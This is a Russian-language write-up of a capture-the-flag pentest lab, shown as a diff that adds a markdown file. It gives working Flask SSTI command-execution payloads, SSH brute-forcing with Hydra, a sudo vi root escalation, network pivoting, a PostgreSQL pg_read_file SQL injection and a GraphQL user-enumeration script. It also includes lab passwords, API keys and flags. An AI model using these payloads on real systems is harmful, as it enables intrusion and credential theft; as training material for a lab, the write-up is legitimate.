@@ -1,0 +1,639 @@
+## Write-up на модуль "Пентест" - Green Skills 2025
+
+### Сервис №1 - Росатом
+
+Для эксплуатации данного сервиса необходимо перейти к **правилам использования** и ввести **SSTI payload** в поле **"Сообщение"**:
+
+![](assets/1.png)
+
+```python
+{{ '7'*7 }}
+```
+
+По ответу сервера станет ясно, что он уязвим к внедрению шаблонов **(Server Side Template Injection)**, вызванному использованием небезопасной функцией **фреймворка Flask**:
+
+![](assets/2.png)
+
+Можно использовать следующий **payload** для просмотра домашней папки и **идентификации существующих пользователей:**
+
+![](assets/3.png)
+
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /home').read() }}
+```
+
+Найден пользователь **masterUser**: 
+
+![](assets/4.png)
+
+После неудачного поиска **SSH-ключей или паролей** следует перейти к брутфорсу пароля. Можно воспользоваться инструментом **Hydra** или аналогичным:
+
+![](assets/5.png)
+
+```sh
+hydra -l masterUser -P rockyou.txt -s 8390 *SERVER_IP* ssh -t 10
+```
+
+Спустя некоторое время пароль найден:
+
+```
+lakers1
+```
+
+Выполняем попытку входа по **SSH**:
+
+![](assets/6.png)
+
+Однако не все так просто и сервер запрашивает ответ на **контрольный вопрос.** Для ответа на него следует вернуться к веб-приложению и поискать, какой скрипт запускает эту проверку. Спустя некоторое время можно обнаружить скрипт **honeypot.sh:**
+
+![](assets/7.png)
+
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /usr/local/bin/honeypot.sh').read() }}
+```
+
+Исходя из него, ответом на контрольный вопрос будет:
+
+```
+app_user_btw
+```
+
+Это сработало и мы внутри. Однако мы имеем доступ лишь к урезанной оболочке **rbash**:
+
+![](assets/8.png)
+
+Можно проверить, какие команды мы имеем право исполнять от имени **root**:
+
+![](assets/9.png)
+
+```sh
+sudo -l
+```
+
+С помощью редактора **vi** мы можем избавиться сразу от двух проблем: сменить оболочку и получить шелл пользователя **root**:
+
+```sh
+sudo vi
+```
+
+```vi
+:set shell=/bin/bash
+:shell
+```
+
+![](assets/10.png)
+
+![](assets/11.png)
+
+После выполнения проделанных действий мы получаем **полный доступ** к машине:
+
+![](assets/12.png)
+
+Первый флаг находится в **домашней директории пользователя:**
+
+```sh
+cat /home/masterUser/user_flag
+```
+
+![](assets/13.png)
+
+Второй в **passwd файле:**
+
+```sh
+cat /etc/passwd
+```
+
+![](assets/14.png)
+
+И третий флаг в **домашней директории root:**
+
+```sh
+cat /root/root_flag
+```
+
+![](assets/15.png)
+
+### Пивотинг
+
+Необходимо разведать информацию о других компьютерах в сети. Утилиты **ifconfig** и **ip** отсутствуют на хосте. В обход этого можно установить пакет **net-tools** и посмотреть маршруты в сети:
+
+```sh
+apt install net-tools
+route
+```
+
+![](assets/16.png)
+
+Как видно из скриншота, на машине существуют 3 машрута, 2 из которых ведут в другие сети. Поочередно просканируем эти сети утилитой **nmap:**
+
+```sh
+nmap -p- 172.16.47.0/24
+nmap -p- 172.16.49.0/24
+```
+
+![](assets/17.png)
+
+![](assets/18.png)
+
+В первой подсети нет ничего, кроме **докер-хоста** и самой машины. А вот во второй замечаем **3 новых IP-адреса: 172.16.49.20, 172.16.49.21, 172.16.49.30.** По именам хостов можно предположить, что **172.16.49.21** выступает в роли БД для **172.16.49.20.**
+
+### Сервис №2 - Notes
+
+Так как сервис располагается во **внутренней локальной сети**, необходимо выполнить **проксирование трафика**, например, посредством SSH + Firefox:
+
+```sh
+ssh -D 1080 masterUser@172.30.226.130 -p 8390
+```
+
+![](assets/19.png)
+
+Настройка прокси в **Firefox**:
+
+![](assets/20.png)
+
+Теперь можно получить доступ к веб-интерфейсу **второго сервиса**, развернутого на порту **4545:**
+
+![](assets/21.png)
+
+Путь **/login** является ложным, не несет в себе смысла. Следует просканировать наличие дополнительных директорий с помощью **gobuster** или альтернативных утилит:
+
+```sh
+gobuster dir -u http://172.16.49.20:4545/ -w *WORDLIST_PATH*
+```
+
+После нахождения пути **/portal** можно добавить тестовую заметку и наблюдать ее в **/notes:**
+
+![](assets/22.png)
+
+![](assets/23.png)
+
+При сканировании утилитой **nmap** ранее мы уже увидели, что веб-приложение использует **PostgreSQL** базу данных. В соответствии с этим можно предположить, что заметки хранятся в БД, а значит, вероятнее всего, перед нами **SQL-инъекция.** В конечном итоге может получиться следующий **payload:**
+
+```sql
+' || (SELECT pg_read_file('/flag.txt', 0, 1000)) || '
+```
+
+Кладем еще один флаг в копилку:
+
+![](assets/24.png)
+
+```
+flag{r3created_allwayz_good_4_8vryb0dy} 
+```
+
+### Сервис №3 - GraphQL
+
+Снова страница авторизации и снова ложный вектор:
+
+![](assets/25.png)
+
+В названии машины, полученном при сканировании **nmap'ом**, находится подсказка. Переходим по пути **/graphql**:
+
+![](assets/26.png)
+
+Немного поискав, можно найти следующий **payload**, выводящий в **output** схему приложения:
+
+```
+{__schema{types{name,fields{name}}}}
+```
+
+<details>
+    <summary>Результат в output</summary>
+    {
+    "data": {
+        "__schema": {
+        "types": [
+            {
+            "name": "Query",
+            "fields": [
+                {
+                "name": "node"
+                },
+                {
+                "name": "allPosts"
+                },
+                {
+                "name": "allUsers"
+                },
+                {
+                "name": "singleUser"
+                }
+            ]
+            },
+            {
+            "name": "Node",
+            "fields": [
+                {
+                "name": "id"
+                }
+            ]
+            },
+            {
+            "name": "ID",
+            "fields": null
+            },
+            {
+            "name": "PostObjectConnection",
+            "fields": [
+                {
+                "name": "pageInfo"
+                },
+                {
+                "name": "edges"
+                }
+            ]
+            },
+            {
+            "name": "PageInfo",
+            "fields": [
+                {
+                "name": "hasNextPage"
+                },
+                {
+                "name": "hasPreviousPage"
+                },
+                {
+                "name": "startCursor"
+                },
+                {
+                "name": "endCursor"
+                }
+            ]
+            },
+            {
+            "name": "Boolean",
+            "fields": null
+            },
+            {
+            "name": "String",
+            "fields": null
+            },
+            {
+            "name": "PostObjectEdge",
+            "fields": [
+                {
+                "name": "node"
+                },
+                {
+                "name": "cursor"
+                }
+            ]
+            },
+            {
+            "name": "PostObject",
+            "fields": [
+                {
+                "name": "uuid"
+                },
+                {
+                "name": "title"
+                },
+                {
+                "name": "body"
+                },
+                {
+                "name": "authorId"
+                },
+                {
+                "name": "author"
+                },
+                {
+                "name": "id"
+                }
+            ]
+            },
+            {
+            "name": "Int",
+            "fields": null
+            },
+            {
+            "name": "UserObject",
+            "fields": [
+                {
+                "name": "uuid"
+                },
+                {
+                "name": "username"
+                },
+                {
+                "name": "isAdmin"
+                },
+                {
+                "name": "posts"
+                },
+                {
+                "name": "id"
+                }
+            ]
+            },
+            {
+            "name": "UserObjectConnection",
+            "fields": [
+                {
+                "name": "pageInfo"
+                },
+                {
+                "name": "edges"
+                }
+            ]
+            },
+            {
+            "name": "UserObjectEdge",
+            "fields": [
+                {
+                "name": "node"
+                },
+                {
+                "name": "cursor"
+                }
+            ]
+            },
+            {
+            "name": "UserInfoObject",
+            "fields": [
+                {
+                "name": "uuid"
+                },
+                {
+                "name": "name"
+                },
+                {
+                "name": "surname"
+                },
+                {
+                "name": "dateOfBirth"
+                },
+                {
+                "name": "apiKey"
+                },
+                {
+                "name": "user"
+                },
+                {
+                "name": "permissions"
+                },
+                {
+                "name": "note"
+                },
+                {
+                "name": "id"
+                }
+            ]
+            },
+            {
+            "name": "__Schema",
+            "fields": [
+                {
+                "name": "types"
+                },
+                {
+                "name": "queryType"
+                },
+                {
+                "name": "mutationType"
+                },
+                {
+                "name": "subscriptionType"
+                },
+                {
+                "name": "directives"
+                }
+            ]
+            },
+            {
+            "name": "__Type",
+            "fields": [
+                {
+                "name": "kind"
+                },
+                {
+                "name": "name"
+                },
+                {
+                "name": "description"
+                },
+                {
+                "name": "fields"
+                },
+                {
+                "name": "interfaces"
+                },
+                {
+                "name": "possibleTypes"
+                },
+                {
+                "name": "enumValues"
+                },
+                {
+                "name": "inputFields"
+                },
+                {
+                "name": "ofType"
+                }
+            ]
+            },
+            {
+            "name": "__TypeKind",
+            "fields": null
+            },
+            {
+            "name": "__Field",
+            "fields": [
+                {
+                "name": "name"
+                },
+                {
+                "name": "description"
+                },
+                {
+                "name": "args"
+                },
+                {
+                "name": "type"
+                },
+                {
+                "name": "isDeprecated"
+                },
+                {
+                "name": "deprecationReason"
+                }
+            ]
+            },
+            {
+            "name": "__InputValue",
+            "fields": [
+                {
+                "name": "name"
+                },
+                {
+                "name": "description"
+                },
+                {
+                "name": "type"
+                },
+                {
+                "name": "defaultValue"
+                }
+            ]
+            },
+            {
+            "name": "__EnumValue",
+            "fields": [
+                {
+                "name": "name"
+                },
+                {
+                "name": "description"
+                },
+                {
+                "name": "isDeprecated"
+                },
+                {
+                "name": "deprecationReason"
+                }
+            ]
+            },
+            {
+            "name": "__Directive",
+            "fields": [
+                {
+                "name": "name"
+                },
+                {
+                "name": "description"
+                },
+                {
+                "name": "locations"
+                },
+                {
+                "name": "args"
+                }
+            ]
+            },
+            {
+            "name": "__DirectiveLocation",
+            "fields": null
+            }
+        ]
+        }
+    }
+    }
+</details>
+
+Попробуем составить запрос, выводящий все поля **UserInfoObject:**
+
+```
+query {
+  singleUser(user: 1) {
+    uuid
+    name
+    surname
+    dateOfBirth
+    apiKey
+    user
+    permissions
+    note
+    id
+  }
+}
+```
+
+Результат в output:
+
+```
+{
+  "data": {
+    "singleUser": {
+      "uuid": "1",
+      "name": "World",
+      "surname": "Skills",
+      "dateOfBirth": "01/09/1985",
+      "apiKey": "klaSKJDOA83847JSDskdjajeb39",
+      "user": 1,
+      "permissions": "user",
+      "note": "nice",
+      "id": "VXNlckluZm9PYmplY3Q6MQ=="
+    }
+  }
+}
+```
+
+Напишем скрипт для перебора **uuid**, предположив, что в одном из полей пользователя будет находиться флаг.
+
+```python
+import requests
+
+url = "http://172.16.49.30:5000/graphql"
+
+for user_id in range(1, 10000):
+    query = f"""
+    query {{
+      singleUser(user: {user_id}) {{
+        uuid
+        name
+        surname
+        dateOfBirth
+        apiKey
+        user
+        permissions
+        note
+        id
+      }}
+    }}
+    """
+
+    response = requests.get(url, params={"query": query})
+
+    if response.status_code == 200:
+        data = response.text.lower()
+        if "flag" in data:
+            print(f"[+] Flag found for user {user_id}:\n{data}")
+            break
+    else:
+        print(f"[-] Error for user {user_id}: {response.status_code}")
+```
+
+![](assets/27.png)
+
+Как видно, флаг найден. Можем так же запросить его и через веб-интерфейс, сменив **ID** пользователя с 1 на **1000:**
+
+```
+query {
+  singleUser(user: 1000) {
+    uuid
+    name
+    surname
+    dateOfBirth
+    apiKey
+    user
+    permissions
+    note
+    id
+  }
+}
+```
+
+Ответ от сервера:
+```
+{
+  "data": {
+    "singleUser": {
+      "uuid": "9",
+      "name": "god",
+      "surname": "dev account",
+      "dateOfBirth": "01/09/1982",
+      "apiKey": "AS7RA968GDBVDQIYILDSY7",
+      "user": 1000,
+      "permissions": "admin",
+      "note": "flag{g00d_job_wh3n_no_matrix_y3a}",
+      "id": "VXNlckluZm9PYmplY3Q6OQ=="
+    }
+  }
+}
+```
+
+Забираем **последний флаг:**
+
+```
+flag{g00d_job_wh3n_no_matrix_y3a}
+```
